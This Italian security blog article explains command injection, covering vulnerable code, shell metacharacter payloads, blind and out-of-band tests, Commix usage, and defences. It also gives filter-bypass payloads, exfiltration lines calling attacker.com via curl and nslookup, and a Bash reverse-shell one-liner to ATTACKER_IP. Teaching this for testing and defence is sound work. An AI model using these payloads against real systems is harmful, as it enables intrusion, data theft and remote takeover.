---
title: 'Command Injection: Payload, Bypass e Come Difendersi'
slug: command-injection
description: 'Scopri cos''è la Command Injection, come funziona, dove si trova e come testarla con Burp Suite e Commix: tecniche blind, OOB, bypass dei filtri e difesa.'
image: /command-injection-pentest.webp
draft: false
date: 2026-10-02T16:19:19.817Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - Command Injection
  - OS Command Injection
  - Burp Suite
  - Commix
---

# Command Injection: Cos'è, Come Funziona e Come Testarla

**Command injection** è la vulnerabilità che si verifica quando un'applicazione passa input controllato dall'utente a un interprete di comandi — tipicamente la shell del sistema operativo — senza sanitizzarlo correttamente. Il risultato può essere l'esecuzione di comandi arbitrari con i privilegi del processo vulnerabile, con un impatto che varia dalla semplice lettura di dati fino alla compromissione del server e dei sistemi raggiungibili da lì.

> **In breve:** la command injection permette di eseguire comandi non previsti su un sistema, sfruttando un input che l'applicazione passa a una shell senza controllarlo. Si trova soprattutto in funzionalità che richiamano strumenti di sistema (ping, DNS lookup, conversione file) e si testa con un metacarattere innocuo (`;`, `whoami`) prima di passare a tecniche più avanzate se l'output non è visibile.

## Command Injection vs OS Command Injection vs Code Injection

Nell'uso comune della sicurezza informatica, "command injection" e "OS command injection" indicano quasi sempre la stessa cosa — lo conferma anche [PortSwigger](https://portswigger.net/web-security/os-command-injection), che nella propria Web Security Academy usa i due termini come sinonimi. A livello di classificazione ufficiale (MITRE CWE) esiste però una gerarchia più precisa:

| Termine                  | CWE    | Cosa descrive                                                                                                                                                                                                                                                                                          |
| ------------------------ | ------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Command Injection**    | CWE-77 | La categoria generale: input che altera un comando eseguito da un interprete, qualunque esso sia                                                                                                                                                                                                       |
| **OS Command Injection** | CWE-78 | Il caso specifico in cui l'interprete è la shell del sistema operativo (bash, cmd.exe) — il caso più comune in assoluto                                                                                                                                                                                |
| **Argument Injection**   | CWE-88 | Variante figlia di CWE-78 (riconosciuta come tale nell'OWASP Top 10 2025): l'input manipola gli argomenti di un comando invece di introdurne uno nuovo                                                                                                                                                 |
| **Code Injection**       | CWE-94 | Categoria distinta: l'input viene interpretato come codice del linguaggio dell'applicazione (es. tramite `eval()`), non passato a una shell — anche se il volume di ricerca per "code injection" è alto quanto quello per "command injection", i due problemi vanno testati e corretti in modo diverso |

In pratica: quando senti parlare di "command injection" in un contesto web, nella stragrande maggioranza dei casi si intende l'iniezione di comandi di sistema — l'OS command injection. La code injection è un problema diverso, anche se a volte le due tecniche possono combinarsi (un `eval()` vulnerabile può a sua volta richiamare una funzione che apre una shell).

Questo articolo copre il concetto generale, dove si trova, come si testa e come ci si difende. Per l'approfondimento tecnico specifico su Linux/Windows e tecniche RCE avanzate, vedi la guida dedicata a [OS Command Injection](https://hackita.it/articoli/os-command-injection/). La command injection fa parte della più ampia famiglia delle vulnerabilità di injection — per una panoramica di come si inserisce rispetto a [LDAP injection](https://hackita.it/articoli/ldap-injection/), [XPath injection](https://hackita.it/articoli/xpath-injection/) e alle altre categorie, vedi la [guida completa agli attacchi alle applicazioni web](https://hackita.it/articoli/attacchi-applicazioni-web/).

## Come Funziona: il Meccanismo

Il problema nasce quando il codice server-side costruisce un comando concatenando stringhe con input dell'utente, invece di passare parametri in modo strutturato:

```python
# Python - vulnerabile
os.system("ping -c 4 " + user_input)
```

```php
// PHP - vulnerabile
system("nslookup " . $_GET['host']);
```

```javascript
// Node.js - vulnerabile
exec("ping -c 4 " + req.query.host);
```

Se `user_input` non viene filtrato, un attaccante può chiudere il comando previsto e aggiungerne uno proprio usando i metacaratteri della shell:

| Metacarattere | Funzione                                               | Esempio              |
| ------------- | ------------------------------------------------------ | -------------------- |
| `;`           | Separatore comandi (Linux)                             | `127.0.0.1; whoami`  |
| `&&`          | Esegue il secondo comando solo se il primo ha successo | `127.0.0.1 && id`    |
| `\|\|`        | Esegue il secondo comando solo se il primo fallisce    | `127.0.0.1 \|\| id`  |
| `\|`          | Pipe, passa l'output al comando successivo             | `127.0.0.1 \| id`    |
| `` ` ` ``     | Command substitution                                   | `` `whoami` ``       |
| `$()`         | Command substitution (alternativa)                     | `$(whoami)`          |
| `%0a` / `\n`  | Newline, separatore su alcuni parser                   | `127.0.0.1%0aid`     |
| `&`           | Esecuzione in background (Windows/Linux)               | `127.0.0.1 & whoami` |

## Dove si Trova una Command Injection

Il campanello d'allarme è qualsiasi funzionalità che, dietro le quinte, richiama un programma o comando di sistema invece di gestire tutto internamente al linguaggio dell'applicazione. Le funzionalità più a rischio, nella pratica, sono: strumenti di **diagnostica di rete** (ping, traceroute, DNS lookup, whois — spesso esposti in pannelli di amministrazione), **conversione ed elaborazione file** (conversione immagini/PDF, generazione thumbnail, compressione/archiviazione), **backup e amministrazione di sistema**, e in generale qualunque funzione che "chiama" un programma esterno invece di usare una libreria nativa. Più un'applicazione è pensata per fare cose "di sistema" — un pannello di gestione server, un tool di monitoraggio interno — più è probabile incontrarla.

## Quali Input Possono Essere Vulnerabili

Non solo i parametri GET/POST visibili nell'URL o in un form: anche **header HTTP**, **cookie**, **nomi di file caricati**, il **corpo JSON** di una richiesta API, e in generale qualunque dato che l'utente controlla, anche indirettamente, può raggiungere una chiamata di sistema vulnerabile. Durante un test vale la pena considerare ogni punto di input, non solo quelli più ovvi — un nome di file scelto dall'utente durante un upload, per esempio, è un vettore spesso trascurato.

## Command Injection e Argument Injection

Secondo la stessa [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html), ogni OS command injection è anche, tecnicamente, un caso di argument injection — non sono due categorie alternative, ma due modi di guardare allo stesso problema con livelli di dettaglio diversi. La differenza pratica emerge quando pensi alla difesa: se applichi un escape dei metacaratteri di shell (bloccando `;`, `&&`, `|`) ma il programma invocato resta lo stesso, l'input controllato dall'utente può comunque finire come **argomento** di quel programma, e non tutti gli argomenti sono innocui.

Esempio concreto: un'applicazione esegue `curl` con un URL fornito dall'utente dopo aver correttamente neutralizzato i metacaratteri di shell. Se l'input accettato è `--help` invece di un URL, `curl` lo interpreta come proprio flag invece che come indirizzo — l'attaccante non ha introdotto un nuovo comando, ha manipolato gli argomenti di quello esistente. A seconda del programma e delle opzioni disponibili, un'argument injection di questo tipo può restare innocua o arrivare fino alla RCE (alcuni tool accettano flag che leggono o scrivono file arbitrari). È il motivo per cui l'escape dei soli metacaratteri di shell (`escapeshellarg()` in PHP, per esempio) riduce ma non elimina del tutto la superficie d'attacco.

## Tipi di Command Injection

**Classica (diretta).** L'output del comando iniettato è visibile direttamente nella risposta dell'applicazione — il caso più semplice da individuare e sfruttare.

**Blind (cieca).** L'applicazione non restituisce l'output del comando, ma il comportamento del server cambia in modo osservabile. La tecnica standard è **time-based**: inietti un comando che introduce un ritardo misurabile, e deduci il successo dall'esecuzione dal tempo di risposta.

```bash
# Time-based, Linux
127.0.0.1; sleep 10
127.0.0.1 && ping -c 10 127.0.0.1

# Time-based, Windows
127.0.0.1 & timeout 10
```

**Out-of-Band (OOB).** Quando anche il timing non è osservabile (rate limiting, timeout applicativi), l'esfiltrazione passa da un canale separato — tipicamente DNS o HTTP verso un server controllato dall'attaccante.

```bash
127.0.0.1; curl http://attacker.com/$(whoami)
127.0.0.1; nslookup $(whoami).attacker.com
```

Questa tecnica è preziosa in ambienti con output filtrato e nessun ritardo osservabile: uno strumento come **Burp Collaborator**, o un semplice listener DNS/HTTP proprio, cattura la richiesta in uscita e conferma l'esecuzione.

## Command Injection per Linguaggio e Contesto

Ogni linguaggio ha le proprie funzioni "pericolose" da cercare durante una code review o un test black-box:

| Linguaggio             | Funzioni a rischio (OS command injection)                            | Payload di test              |
| ---------------------- | -------------------------------------------------------------------- | ---------------------------- |
| **PHP**                | `system()`, `exec()`, `shell_exec()`, `passthru()`, `` `backtick` `` | `; id`, `\| cat /etc/passwd` |
| **Python**             | `os.system()`, `subprocess` con `shell=True`                         | `; id`, `&& id`              |
| **Node.js/JavaScript** | `child_process.exec()` / `execSync()` (non `execFile()`)             | `; id`, `` `id` ``           |
| **Java**               | `Runtime.exec()` con stringa concatenata (non l'overload ad array)   | `; id`, `&& id`              |
| **.NET**               | `Process.Start()` con argomenti costruiti per concatenazione         | `& whoami`, `&& whoami`      |

**Vettori indiretti da conoscere.** Il percorso verso l'esecuzione di comandi non passa sempre da una di queste funzioni chiamate direttamente. Una [SQL injection](https://hackita.it/articoli/sql-injection/) che raggiunge `xp_cmdshell` (MSSQL) o una UDF di sistema MySQL *degenera* in esecuzione di comandi una volta ottenuto l'accesso — resta una SQL injection nella causa, non una command injection "pura" fin dall'inizio, ma il risultato finale è lo stesso. Allo stesso modo, un parser che passa il contenuto di un file o di un campo a un comando esterno (conversione immagini, elaborazione di metadati) può introdurre command injection senza che il codice contenga nessuna delle funzioni elencate sopra — motivo per cui la code review da sola non basta sempre, serve anche testare il comportamento reale dell'applicazione.

## Come Testare una Command Injection

1. **Individua i parametri candidati**: campi che richiamano funzionalità di rete o sistema (ping, traceroute, DNS lookup, conversione file, generazione PDF/immagini) sono i sospetti principali.
2. **Inietta un metacarattere innocuo** (`;`, `&&`, `|`) seguito da un comando che non danneggia nulla ma è facilmente verificabile, come `whoami` o `id`.
3. **Se l'output non è visibile**, passa a un test time-based con `sleep`/`timeout` e misura la differenza di latenza rispetto a una richiesta baseline.
4. **Se anche il timing non è osservabile**, prova OOB con un listener DNS o HTTP sotto il tuo controllo.
5. **Conferma e documenta**: una volta ottenuta esecuzione, verifica il contesto utente (`id`/`whoami`) per capire il livello di impatto prima di proseguire con eventuale post-exploitation.

### Test Manuale con Burp Suite

Prima di automatizzare, vale la pena capire il flusso manuale con [Burp Suite](https://hackita.it/articoli/burp-suite/) — è quello che userai comunque per confermare o investigare un caso dubbio:

1. **Intercetta la richiesta** che richiama la funzionalità sospetta (es. `GET /ping?host=127.0.0.1`).
2. **Manda la richiesta a Repeater** e stabilisci una baseline: qual è la risposta normale, quanto tempo impiega.
3. **Modifica il parametro** aggiungendo un separatore e un comando innocuo: `host=127.0.0.1;whoami` (o `&&whoami`, `|whoami` a seconda del contesto).
4. **Confronta risultato e timing** con la baseline: un output diverso (l'username al posto della risposta ping) conferma l'injection diretta; nessuna differenza visibile ma un ritardo con `sleep` conferma una blind.

## Automatizzare con Commix

**Commix** automatizza l'intero processo sopra — individuazione del parametro vulnerabile, scelta della tecnica (classica, time-based, OOB) e sfruttamento:

```bash
commix --url="http://10.10.10.50/ping.php?host=127.0.0.1" --batch
```

Per i casi in cui la vulnerabilità è raggiunta tramite un parametro POST o richiede autenticazione, Commix supporta anche request salvate da Burp Suite tramite l'opzione `--requestfile`. Per il fuzzing manuale con ffuf o Burp Intruder, la [wordlist dedicata al command injection](https://hackita.it/articoli/wordlist/) di SecLists è il punto di partenza standard.

## Command Injection e WAF

Quando un WAF blocca i metacaratteri più comuni, alcune varianti spesso non filtrate includono l'uso di `${IFS}` al posto dello spazio (Linux), la concatenazione di variabili d'ambiente per ricostruire comandi filtrati per parola chiave, e l'encoding degli stessi metacaratteri (URL encoding, doppio encoding). La superficie di bypass dipende fortemente dalla configurazione specifica del WAF target — non esiste un payload universale, va enumerato caso per caso. Ma il punto più importante è un altro: **un WAF può contribuire a rilevare o rallentare un attacco, ma non è una remediation della vulnerabilità**. La protezione va costruita nel codice — API sicure, separazione tra comando e argomenti, allowlist — perché prima o poi un bypass si trova.

## Bypass di Filtri Avanzati

Oltre a encoding e `${IFS}` già visti, una serie di trucchi più specifici torna utile quando un filtro blocca spazi, slash o parole chiave precise:

**Bypass dello spazio** (oltre a `${IFS}`):

```bash
cat${IFS}/etc/passwd
cat<>/etc/passwd          # redirezione al posto dello spazio
X=$'cat\x20/etc/passwd'&&$X
{cat,/etc/passwd}         # brace expansion, ogni elemento diventa un argomento
```

**Bypass di blacklist su parole intere** (es. "cat", "bash" bloccati come stringa):

```bash
c'a't /etc/passwd          # quoting che la shell ignora ma rompe il match testuale
c""at /etc/passwd
w\ho\ami                   # backslash prima di una lettera, la shell lo rimuove
/bin/c??                   # wildcard al posto dei caratteri bloccati — espande a /bin/cat se è l'unico match
```

**Bypass tramite concatenazione di variabili** (aggira filtri basati su regex sull'intera stringa comando):

```bash
a=l;b=s;$a$b               # esegue "ls" senza che "ls" compaia mai come stringa letterale
```

**Su Windows (cmd.exe)**, il caret `^` spezza il riconoscimento di parole chiave in modo simile al backslash di Linux:

```cmd
w^hoami
who^ami
```

**Bypass tramite Base64**, utile quando il filtro accetta solo caratteri alfanumerici e pochi altri simboli:

```bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

Il payload reale (`cat /etc/passwd`) non compare mai in chiaro nella richiesta — solo la sua codifica, decodificata ed eseguita lato server.

Nessuno di questi bypass è garantito: dipende da come il filtro è implementato (blacklist su singoli caratteri, su parole intere, su regex più sofisticate). L'approccio corretto è provarli in sequenza, non assumere che uno specifico funzioni sempre.

## Dopo la Conferma: Ottenere una Shell Interattiva

Una volta confermata l'esecuzione di comandi, il passo successivo tipico è trasformarla in una shell interattiva invece di eseguire comandi uno alla volta. Un one-liner Bash è spesso il modo più rapido:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

iniettato come corpo del comando (es. `127.0.0.1; bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`), con un listener in ascolto sulla macchina dell'attaccante (`nc -lvnp 4444`). Su target senza Bash disponibile, le alternative standard includono one-liner in Python, Perl o PHP a seconda di cosa è installato sul sistema compromesso.

## Impatto di una Command Injection

L'esecuzione di comandi avviene con i **privilegi del processo compromesso**, non necessariamente con privilegi di amministratore: un'applicazione web che gira con un utente limitato dà a chi la sfrutta solo quell'accesso limitato, almeno come punto di partenza. Da lì, l'impatto tipico include la lettura di file accessibili all'account (spesso codice sorgente e file di configurazione con credenziali), l'uso di quelle credenziali per muoversi verso altri sistemi collegati, e — se l'ambiente lo permette — un'escalation verso privilegi più alti. Il punto da tenere a mente: **una command injection non equivale automaticamente al controllo completo del server**. Quanto è grave dipende dai privilegi del processo, da quanto è isolato (container, sandboxing) e da cos'altro è raggiungibile da lì.

## Come Proteggersi

La difesa più solida è strutturale, non un filtro aggiunto in un secondo momento: **evitare del tutto la chiamata a una shell** quando possibile, preferendo API native del linguaggio che accettano argomenti come array invece di stringhe concatenate (`subprocess.run(["ping", "-c", "4", host])` in Python, non `os.system()`). Quando la shell è inevitabile, un **allowlist** di caratteri/pattern attesi è molto più robusta di una blocklist di metacaratteri — che va quasi sempre in bypass prima o poi. Il principio del minimo privilegio sul processo che esegue il comando limita infine il danno anche quando l'injection avviene comunque.

## FAQ

**Cos'è una command injection?** Una vulnerabilità che permette di eseguire comandi arbitrari su un sistema, sfruttando input utente non sanitizzato che raggiunge un interprete di comandi (shell di sistema o funzioni di esecuzione dinamica di un linguaggio).

**Qual è la differenza tra command injection e code injection?** La command injection inietta comandi eseguiti da una shell di sistema; la code injection inietta codice nel linguaggio stesso dell'applicazione (tramite funzioni come `eval()`). Sono categorie tecnicamente distinte (CWE-78 contro CWE-94), anche se nel linguaggio comune capita di sentirle usare in modo intercambiabile.

**Come si rileva una command injection cieca (blind)?** Iniettando comandi che introducono un ritardo misurabile (`sleep`, `timeout`) e osservando la differenza nei tempi di risposta rispetto a una richiesta normale; se nemmeno il timing è osservabile, si passa a tecniche out-of-band via DNS o HTTP.

**Commix funziona come sqlmap ma per command injection?** Sì, concettualmente: automatizza individuazione e sfruttamento della vulnerabilità allo stesso modo in cui sqlmap lo fa per la SQL injection, supportando tecniche classiche, time-based e OOB.

**Un WAF blocca sempre la command injection?** No: i filtri basati su blocklist di metacaratteri sono frequentemente aggirabili con encoding, variabili d'ambiente o caratteri alternativi come `${IFS}` — motivo per cui un WAF non sostituisce una remediation a livello di codice.

**La command injection può portare a Remote Code Execution (RCE)?** Sì: quando permette a un attaccante remoto di eseguire comandi arbitrari, l'impatto viene classificato come RCE. Il livello effettivo di compromissione dipende comunque dai privilegi del processo vulnerabile e dai controlli di isolamento presenti sul sistema.

**La command injection funziona sia su Linux che su Windows?** Sì, con sintassi diverse: su Linux i separatori tipici sono `;`, `&&`, `|`; su Windows si usano `&`, `&&`, `|` con `cmd.exe`, o l'equivalente in PowerShell con `;` come separatore di pipeline.

**Qual è la differenza tra command injection e SQL injection?** La command injection sfrutta un interprete di comandi di sistema; la [SQL injection](https://hackita.it/articoli/sql-injection/) sfrutta un database. Possono incontrarsi: una SQL injection che raggiunge `xp_cmdshell` degenera in esecuzione di comandi di sistema.

**Quali funzioni PHP possono causare command injection?** Principalmente `system()`, `exec()`, `shell_exec()`, `passthru()` e l'operatore backtick — tutte funzioni che passano una stringa a una shell.

**Burp Suite rileva automaticamente la command injection?** Lo scanner di Burp Suite Pro può segnalarla in molti casi, ma le blind e le OOB più complesse spesso richiedono conferma manuale o uno strumento dedicato come Commix.

**Come si bypassa un filtro che blocca lo spazio?** Con alternative come `${IFS}`, la redirezione `<>`, la brace expansion (`{cat,/etc/passwd}`) o un carattere di escape che la shell rimuove ma che rompe il pattern matching del filtro.

**Cosa si fa dopo aver confermato una command injection?** Tipicamente si passa da comandi singoli a una shell interattiva, ad esempio con un one-liner Bash (`bash -i >& /dev/tcp/IP/PORTA 0>&1`) e un listener in ascolto, per poter proseguire con l'enumerazione del sistema in modo più efficiente.
